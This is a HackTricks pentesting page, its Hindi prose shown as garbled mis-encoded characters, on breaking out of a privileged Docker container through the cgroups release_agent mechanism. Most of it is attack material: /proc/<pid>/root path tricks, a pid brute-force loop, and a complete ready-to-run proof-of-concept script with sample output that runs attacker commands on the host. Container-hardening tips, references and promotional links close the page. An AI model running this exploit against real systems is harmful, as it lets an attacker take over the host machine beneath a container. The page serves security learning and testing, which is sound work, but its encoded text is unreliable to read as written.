рд▓рд┐рдирдХреНрд╕ `/proc` рдкреНрд╕реНрдпреВрдбреЛ-рдлрд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЪрд▓ рд░рд╣реА рд╕рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХрд░реНрдиреЗрд▓ рдкреНрд░реЛрд╕реЗрд╕ рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рдирдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рднреА рд╢рд╛рдорд┐рд▓ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ред рдЗрд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рдФрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдкреНрд░реЛрд╕реЗрд╕ рдХреА `/proc` рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_рдПрдХ рдмрд╛рдд рдХрд╛ рдЬрд┐рдХреНрд░ рдХрд░рдирд╛ рдЪрд╛рд╣реВрдВрдЧрд╛, `/proc/<pid>/root` рдбреЗрдЯрд╛ рд╕рдВрд░рдЪрдирд╛ рдПрдХ рдРрд╕реА рдЪреАрдЬ рд╣реИ рдЬрд┐рд╕рдиреЗ рдореБрдЭреЗ рдмрд╣реБрдд рд▓рдВрдмреЗ рд╕рдордп рддрдХ рднреНрд░рдорд┐рдд рдХрд┐рдпрд╛, рдореИрдВ рдХрднреА рдирд╣реАрдВ рд╕рдордЭ рдкрд╛рдпрд╛ рдХрд┐ `/` рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рд╣реЛрдирд╛ рдХреНрдпреЛрдВ рдЙрдкрдпреЛрдЧреА рд╣реИ, рдЬрдм рддрдХ рдХрд┐ рдореИрдВрдиреЗ рдореИрди рдкреЗрдЬреЗрд╕ рдореЗрдВ рдЗрд╕рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкрд░рд┐рднрд╛рд╖рд╛ рдирд╣реАрдВ рдкрдврд╝реА:_

> /proc/\[pid\]/root
>
> UNIX рдФрд░ Linux рдореЗрдВ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреА рдЬрдбрд╝ рдХрд╛ рд╡рд┐рдЪрд╛рд░ рд╕рдорд░реНрдерд┐рдд рд╣реИ, рдЬрд┐рд╕реЗ chroot\(2\) рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдлрд╛рдЗрд▓ рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рд╣реИ рдЬреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрдбрд╝ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ, рдФрд░ exe рдФрд░ fd/\* рдХреА рддрд░рд╣ рд╣реА рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
>
> рд╣рд╛рд▓рд╛рдВрдХрд┐, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдлрд╛рдЗрд▓ рдХреЗрд╡рд▓ рдПрдХ рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдирд╣реАрдВ рд╣реИред рдпрд╣ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╡рд╣реА рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ \(рд╕рд╣рд┐рдд рдирд╛рдорд╕реНрдерд╛рди рдФрд░ рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рдЙрдВрдЯреНрд╕ рдХрд╛ рд╕реЗрдЯ\) рдЬреИрд╕рд╛ рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрд╡рдпрдВред

`/proc/<pid>/root` рдкреНрд░рддреАрдХрд╛рддреНрдордХ рд▓рд┐рдВрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╣реЛрд╕реНрдЯ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде рдХреЗ рд░реВрдк рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╣реИ:Container
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
рдЗрд╕рд╕реЗ рд╣рдорд▓реЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдмрджрд▓ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдХреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рд╕рд╛рдкреЗрдХреНрд╖ рдкреВрд░реНрдг рдкрде рдХреЛ рдЬрд╛рдирдиреЗ рдХреА рдмрдЬрд╛рдп, рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдЪрд▓ рд░рд╣реА _рдХрд┐рд╕реА рднреА_ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА pid рдХреЛ рдЬрд╛рдирдирд╛ рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

### Pid Bashing <a id="pid-bashing"></a>

рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЖрд╕рд╛рди рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, Linux рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд╣реЛрддреА рд╣реИ рдФрд░ рдХреНрд░рдорд┐рдХ рд░реВрдк рд╕реЗ рдЕрд╕рд╛рдЗрди рдХреА рдЬрд╛рддреА рд╣реИред `init` рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА `1` рдЕрд╕рд╛рдЗрди рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рд╕рднреА рдмрд╛рдж рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╡реГрджреНрдзрд┐рд╢реАрд▓ рдЖрдИрдбреА рджреА рдЬрд╛рддреА рд╣реИред рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рд╣реЛрд╕реНрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдПрдХ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рд╡реГрджреНрдзрд┐рд╢реАрд▓ рдЦреЛрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
рдореЗрдЬрд╝рдмрд╛рди
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### рд╕рднреА рдЪреАрдЬреЛрдВ рдХреЛ рдПрдХ рд╕рд╛рде рд░рдЦрддреЗ рд╣реБрдП <a id="putting-it-all-together"></a>

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `/proc/<pid>/root/payload.sh` рдкрде рдХреЗ рд▓рд┐рдП pid рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдореЗрдВ рдЕрдиреБрдорд╛рдирд┐рдд pid рдкрде рдХреЛ cgroups `release_agent` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, `release_agent` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдИ рдЧрдИ рд╣реИред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде рдПрдХрдорд╛рддреНрд░ рд╕рд╛рд╡рдзрд╛рдиреА рдпрд╣ рд╣реИ рдХрд┐ рдпрд╣ рдХрд┐рд╕реА рднреА рддрд░рд╣ рд╕реЗ рд╕реВрдХреНрд╖реНрдо рдирд╣реАрдВ рд╣реИ, рдФрд░ pid рдХреА рдЧрд┐рдирддреА рдХреЛ рдмрд╣реБрдд рдЕрдзрд┐рдХ рдмрдврд╝рд╛ рд╕рдХрддрд╛ рд╣реИред рдЪреВрдВрдХрд┐ рдХреЛрдИ рднреА рд▓рдВрдмреЗ рд╕рдордп рддрдХ рдЪрд▓рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЪрд▓рд╛рдИ рдирд╣реАрдВ рдЬрд╛рддреА рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ _рдЪрд╛рд╣рд┐рдП_ рдХрд┐ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рдХреЗ рдореБрджреНрджреЗ рдкреИрджрд╛ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЗрд╕ рдкрд░ рдореЗрд░реЗ рд╢рдмреНрджреЛрдВ рдХреЛ рдЙрджреНрдзреГрдд рди рдХрд░реЗрдВред

рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ PoC рдЗрди рддрдХрдиреАрдХреЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ Felix рдХреЗ рдореВрд▓ PoC рдореЗрдВ рдкрд╣рд▓реА рдмрд╛рд░ рдкреНрд░рд╕реНрддреБрдд рдХреА рдЧрдИ рддреБрд▓рдирд╛ рдореЗрдВ рдПрдХ рдЕрдзрд┐рдХ рд╕рд╛рдорд╛рдиреНрдп рд╣рдорд▓рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬреЛ рдХрд┐ cgroups `release_agent` рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЧрдП PoC рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдЖрдЙрдЯрдкреБрдЯ рдкреНрд░рджрд╛рди рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ

Docker рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдФрд░ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдвреАрд▓рд╛ рдХрд░рдиреЗ рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рдореБрджреНрджреЗ рдкреИрджрд╛ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рднрд▓реЗ рд╣реА `--privileged` рдлреНрд▓реИрдЧ рдХреА рдкреВрд░реА рд╢рдХреНрддрд┐ рдХреЗ рдмрд┐рдирд╛ред рдкреНрд░рддреНрдпреЗрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдФрд░ рдХреБрд▓ рдорд┐рд▓рд╛рдХрд░ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдиреНрдпреВрдирддрдо рдЖрд╡рд╢реНрдпрдХрддрд╛ рддрдХ рд╕реАрдорд┐рдд рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред

рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП:

* `--privileged` рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ рдпрд╛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ [Docker рд╕реЙрдХреЗрдЯ рдорд╛рдЙрдВрдЯ рди рдХрд░реЗрдВ](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)ред Docker рд╕реЙрдХреЗрдЯ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рд╕реНрдкреЙрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╣реЛрд╕реНрдЯ рдХрд╛ рдкреВрд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд▓реЗрдиреЗ рдХрд╛ рдПрдХ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `--privileged` рдлреНрд▓реИрдЧ рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдХрд░ред
* рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рди рдЪрд▓рд╛рдПрдВред [рдЕрд▓рдЧ рдпреВрдЬрд░](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдпрд╛ [рдпреВрдЬрд░ рдиреЗрдорд╕реНрдкреЗрд╕](https://docs.docker.com/engine/security/userns-remap/) рдХрд╛ред рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд░реВрдЯ рд╣реЛрд╕реНрдЯ рдкрд░ рд╡рд╣реА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдпреВрдЬрд░ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рд░реАрдореИрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ Linux рдиреЗрдорд╕реНрдкреЗрд╕, рдХреНрд╖рдорддрд╛рдУрдВ рдФрд░ cgroups рджреНрд╡рд╛рд░рд╛ рд╣рд▓реНрдХреЗ рд░реВрдк рд╕реЗ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рд╣реЛрддрд╛ рд╣реИред
* [рд╕рднреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдбреНрд░реЙрдк рдХрд░реЗрдВ](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) \(`--cap-drop=all`\) рдФрд░ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реЗрдВ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ рдЬреЛ рдЖрд╡рд╢реНрдпрдХ рд╣реИрдВ \(`--cap-add=...`\)ред рдХрдИ рдХрд╛рд░реНрдпрднрд╛рд░реЛрдВ рдХреЛ рдХрд┐рд╕реА рднреА рдХреНрд╖рдорддрд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╣рдорд▓реЗ рдХреА рдЧреБрдВрдЬрд╛рдЗрд╢ рдмрдврд╝ рдЬрд╛рддреА рд╣реИред
* [тАЬno-new-privilegesтАЭ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) рддрд╛рдХрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рди рдХрд░ рд╕рдХреЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП suid рдмрд╛рдЗрдирд░реАрдЬ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред
* [рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░реЗрдВ](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)ред рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛рдПрдВ рдорд╢реАрди рдХреЛ рд╕реЗрд╡рд╛ рд╕реЗ рдЗрдирдХрд╛рд░ рд╣рдорд▓реЛрдВ рд╕реЗ рдмрдЪрд╛ рд╕рдХрддреА рд╣реИрдВред
* [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) \(рдпрд╛ SELinux\) рдкреНрд░реЛрдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдорд╛рдпреЛрдЬрд┐рдд рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрдВрдЯреЗрдирд░ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ syscalls рдХреЛ рдиреНрдпреВрдирддрдо рдЖрд╡рд╢реНрдпрдХрддрд╛ рддрдХ рд╕реАрдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* [рдЖрдзрд┐рдХрд╛рд░рд┐рдХ docker рдЗрдореЗрдЬреЗрд╕](https://docs.docker.com/docker-hub/official_images/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдпрд╛ рдЙрдирдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрдкрдиреА рдЦреБрдж рдХреА рдмрдирд╛рдПрдВред [рдмреИрдХрдбреЛрд░реНрдб](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) рдЗрдореЗрдЬреЗрд╕ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рди рд▓реЗрдВ рдпрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред
* рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдиреА рдЗрдореЗрдЬреЗрд╕ рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдЪ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреБрдирдГ рдмрдирд╛рдПрдВред рдпрд╣ рдмрд┐рдирд╛ рдХрд╣реЗ рд╕рдордЭрд╛ рдЬрд╛рддрд╛ рд╣реИред

# рд╕рдВрджрд░реНрдн

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
